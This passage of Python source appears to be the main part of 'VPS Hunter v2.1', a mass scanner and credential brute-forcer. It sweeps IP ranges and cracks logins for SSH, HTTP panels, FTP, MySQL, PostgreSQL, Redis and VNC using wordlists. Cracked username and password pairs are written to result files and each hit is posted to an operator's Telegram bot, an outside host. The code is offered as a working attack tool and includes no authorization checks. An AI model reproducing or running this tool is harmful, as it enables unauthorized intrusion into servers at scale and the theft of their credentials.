            ports=self._parse_ports(args.ports)
        )
        self.ssh_cracker = SSHCracker(
            timeout=args.crack_timeout,
            max_concurrent=args.crack_concurrent,
            delay=args.delay,
            max_workers=args.crack_workers
        )
        self.http_cracker = HTTPCracker(
            timeout=args.crack_timeout * 2,
            max_concurrent=args.crack_concurrent
        )
        self.ftp_cracker = FTPCracker(
            timeout=args.crack_timeout,
            max_workers=args.crack_workers
        )
        self.db_cracker = DatabaseCracker(
            timeout=args.crack_timeout,
            max_workers=args.crack_workers
        )
        self.vnc_cracker = VNCCracker(
            timeout=args.crack_timeout
        )

    def _parse_ports(self, ports_str: str) -> List[int]:
        if not ports_str:
            return ALL_PORTS
        ports = []
        for part in ports_str.split(','):
            part = part.strip()
            if '-' in part:
                start, end = part.split('-')
                ports.extend(range(int(start), int(end) + 1))
            else:
                ports.append(int(part))
        return ports

    def _save_result(self, result: CrackResult):
        if self.output_file:
            line = (f"{result.ip}:{result.port} | {result.protocol}/{result.service} | "
                    f"{result.username}:{result.password} | {result.panel_name} | {result.timestamp}\n")
            self.output_file.write(line)
            self.output_file.flush()
        if hasattr(self, 'output_json_file') and self.output_json_file:
            self.output_json_file.write(json.dumps(result.to_dict()) + "\n")
            self.output_json_file.flush()
            
    async def _send_telegram(self, result: CrackResult):
        if not self.telegram.enabled:
            return
            
        msg = f"🟢 <b>NEW HIT FOUND!</b>\n"
        msg += f"🖥 <b>IP:</b> <code>{result.ip}:{result.port}</code>\n"
        msg += f"🌐 <b>Protocol:</b> {result.protocol.upper()}\n"
        msg += f"⚙️ <b>Service:</b> {result.service}\n"
        
        if result.panel_name:
            msg += f"🗂 <b>Panel:</b> {result.panel_name}\n"
            
        msg += f"👤 <b>User:</b> <code>{result.username}</code>\n"
        msg += f"🔑 <b>Pass:</b> <code>{result.password}</code>\n"
        
        try:
            url = f"https://api.telegram.org/bot{self.telegram.token}/sendMessage"
            payload = {
                "chat_id": self.telegram.chat_id,
                "text": msg,
                "parse_mode": "HTML"
            }
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=payload, timeout=5) as resp:
                    pass
        except Exception as e:
            cprint(Colors.RED, f"  [!] Failed to send Telegram alert: {e}")

    def _print_cracked(self, result: CrackResult):
        panel_info = f" ({result.panel_name})" if result.panel_name else ""
        cprint(Colors.GREEN + Colors.BOLD,
            f"  ★ [CRACKED] {result.ip}:{result.port} [{result.service}]{panel_info} -> {result.username}:{result.password}")

    async def attack_target(self, target: ScanResult) -> List[CrackResult]:
        results = []
        self.stats.attacked += 1

        # Get credential iterator
        creds_iter = self.wordlist.get_creds_stream(
            target.protocol,
            target.service,
            self.args.wordlist
        )

        cprint(Colors.YELLOW,
            f"  [ATTACK] {target.ip}:{target.port} [{target.protocol}] (streaming)")

        try:
            if target.protocol == "ssh":
                if self.deps.get("paramiko", False):
                    result = await self.ssh_cracker.crack(target, creds_iter, self.stats)
                    if result:
                        results.append(result)
                else:
                    cprint(Colors.RED, f"  [SKIP] SSH: paramiko not installed")

            elif target.protocol == "http":
                # HTTP uses its own streaming inside
                results = await self.http_cracker.crack(target, creds_iter, self.stats)

            elif target.protocol == "ftp":
                if self.deps.get("ftplib", True):  # ftplib is built‑in
                    result = await self.ftp_cracker.crack(target, creds_iter, self.stats)
                    if result:
                        results.append(result)
                else:
                    cprint(Colors.RED, f"  [SKIP] FTP: ftplib not available (shouldn't happen)")

            elif target.protocol == "mysql":
                if self.deps.get("pymysql", False):
                    result = await self.db_cracker.crack_mysql(target, creds_iter, self.stats)
                    if result:
                        results.append(result)
                else:
                    cprint(Colors.RED, f"  [SKIP] MySQL: pymysql not installed")

            elif target.protocol == "postgres":
                if self.deps.get("psycopg2", False):
                    result = await self.db_cracker.crack_postgres(target, creds_iter, self.stats)
                    if result:
                        results.append(result)
                else:
                    cprint(Colors.RED, f"  [SKIP] PostgreSQL: psycopg2 not installed")

            elif target.protocol == "redis":
                if self.deps.get("redis", False):
                    result = await self.db_cracker.crack_redis(target, self.stats)
                    if result:
                        results.append(result)
                else:
                    cprint(Colors.RED, f"  [SKIP] Redis: redis-py not installed")

            elif target.protocol == "vnc":
                result = await self.vnc_cracker.check_noauth(target, self.stats)
                if result:
                    results.append(result)

        except Exception as e:
            self.stats.errors += 1
            cprint(Colors.RED, f"  [ERROR] {target.ip}:{target.port} - {str(e)[:80]}")
        return results

    async def run(self):
        print_banner()

        cprint(Colors.CYAN, f"[*] Parsing targets: {self.args.target}")
        self.stats.total_ips = NetworkUtils.count_targets(self.args.target)
        targets_iter = NetworkUtils.parse_targets(self.args.target)
        cprint(Colors.GREEN, f"[+] {self.stats.total_ips} targets counted")
        cprint(Colors.DIM, f"[*] Ports: {self._parse_ports(self.args.ports)}")
        cprint(Colors.DIM, f"[*] Scan timeout: {self.args.timeout}s | Crack timeout: {self.args.crack_timeout}s")

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_path = f"results_{timestamp}.txt"
        self.output_file = open(output_path, 'w')
        self.output_file.write(f"# VPS Hunter Results - {datetime.now()}\n")
        self.output_file.write(f"# Target: {self.args.target}\n")
        self.output_file.write("#" + "=" * 60 + "\n\n")
        
        json_path = output_path.replace('.txt', '.jsonl')
        self.output_json_file = open(json_path, 'w')

        cprint(Colors.BOLD, "\n[*] Phase 1: Network Scan")
        cprint(Colors.DIM, "─" * 40)
        scan_results = await self.scanner.scan_network(targets_iter, self.stats, self.progress)

        cprint(Colors.GREEN, f"\n[+] Scan complete: {len(scan_results)} open ports found")
        if not scan_results:
            cprint(Colors.RED, "[!] No open ports found. Exiting.")
            self.output_file.close()
            return

        if self.args.protocol:
            scan_results = [r for r in scan_results if r.protocol == self.args.protocol]
            cprint(Colors.DIM, f"[*] Filtered to {self.args.protocol}: {len(scan_results)} targets")

        cprint(Colors.BOLD, "\n[*] Phase 2: Credential Testing")
        cprint(Colors.DIM, "─" * 40)

        priority = {"ssh": 0, "http": 1, "rdp": 2, "ftp": 3, "mysql": 4, "postgres": 5, "redis": 6}
        scan_results.sort(key=lambda x: priority.get(x.protocol, 99))

        for target in scan_results:
            results = await self.attack_target(target)
            for result in results:
                self.stats.cracked += 1
                self.results.append(result)
                self._print_cracked(result)
                self._save_result(result)
                if self.telegram.enabled:
                    asyncio.create_task(self._send_telegram(result))
            self.progress.update(stats=self.stats, current_target=f"{target.ip}:{target.port}")

        self._print_summary(output_path)
        self.output_file.close()
        if hasattr(self, 'output_json_file') and self.output_json_file:
            self.output_json_file.close()
            
        self.ssh_cracker.close()
        self.ftp_cracker.close()
        self.db_cracker.close()
        await self.http_cracker.close()

    def _print_summary(self, output_path: str):
        print("\n" + "=" * 50)
        cprint(Colors.BOLD, "          FINAL RESULTS")
        print("=" * 50)
        cprint(Colors.WHITE, f"  Targets scanned:  {self.stats.total_ips}")
        cprint(Colors.GREEN, f"  Open ports:       {self.stats.open_ports}")
        cprint(Colors.YELLOW, f"  Services attacked: {self.stats.attacked}")
        cprint(Colors.RED, f"  Cracked:          {self.stats.cracked} ★")
        cprint(Colors.MAGENTA, f"  Total attempts:   {self.stats.attempts}")
        cprint(Colors.DIM, f"  Avg speed:        {self.stats.speed:.1f} attempts/s")
        cprint(Colors.DIM, f"  Total time:       {self.stats.elapsed}")
        cprint(Colors.DIM, f"  Errors:           {self.stats.errors}")
        print("-" * 50)
        cprint(Colors.CYAN, f"  Results saved to: {output_path}")
        if self.results:
            json_path = output_path.replace('.txt', '.jsonl')
            cprint(Colors.CYAN, f"  JSONL export:     {json_path}")
        print("=" * 50)

# ──────────────────────────────────────────────────────────────
# CLI ENTRY POINT
# ──────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="VPS Hunter v2.1 — Professional VPS Scanner & Credential Tester",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s 192.168.1.0/24
  %(prog)s 10.0.0.1-10.0.0.254 -p ssh
  %(prog)s @targets.txt -w wordlist.txt -P 22,2222
  %(prog)s 172.16.0.0/16 --delay 0.5 --scan-concurrent 500
        """
    )
    parser.add_argument("target", help="IP, range, CIDR, or @file.txt")
    parser.add_argument("-P", "--ports", default="", help="Ports to scan (e.g., '22,80,443' or '1-1024')")
    parser.add_argument("-p", "--protocol", choices=["ssh", "http", "ftp", "mysql", "postgres", "redis", "rdp", "vnc"],
                        help="Only attack specific protocol")
    parser.add_argument("-w", "--wordlist", help="Custom wordlist (user:pass format)")
    parser.add_argument("-u", "--userlist", help="Username list (combine with --passlist)")
    parser.add_argument("--passlist", help="Password list (combine with -u)")
    parser.add_argument("-t", "--timeout", type=float, default=3.0, help="Scan timeout (default: 3s)")
    parser.add_argument("-T", "--crack-timeout", type=float, default=8.0, help="Crack timeout (default: 8s)")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay between attempts (default: 0)")
    parser.add_argument("--scan-concurrent", type=int, default=300, help="Max concurrent scans (default: 300)")
    parser.add_argument("--crack-concurrent", type=int, default=30, help="Max concurrent cracks (default: 30)")
    parser.add_argument("--crack-workers", type=int, default=10, help="Threads per cracker (default: 10)")
    parser.add_argument("-o", "--output", help="Output file path")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    
    # Notifications
    parser.add_argument("--telegram-token", help="Telegram bot token for notifications")
    parser.add_argument("--telegram-chat", help="Telegram chat ID for notifications")

    args = parser.parse_args()

    if args.userlist and not args.passlist:
        parser.error("--passlist required with --userlist")
    if args.passlist and not args.userlist:
        parser.error("--userlist required with --passlist")
    if args.userlist and args.passlist:
        # Combine into a custom wordlist? Not implemented; we'll warn.
        cprint(Colors.YELLOW, "[!] --userlist/--passlist not fully implemented; use --wordlist instead.")

    hunter = VPSHunter(args)
    try:
        asyncio.run(hunter.run())
    except KeyboardInterrupt:
        cprint(Colors.YELLOW, "\n[!] Interrupted by user")
        hunter._print_summary("interrupted")
        if hunter.output_file:
            hunter.output_file.close()
        asyncio.run(hunter.http_cracker.close())
    except Exception as e:
        cprint(Colors.RED, f"\n[!] Fatal error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()

if __name__ == "__main__":
    main()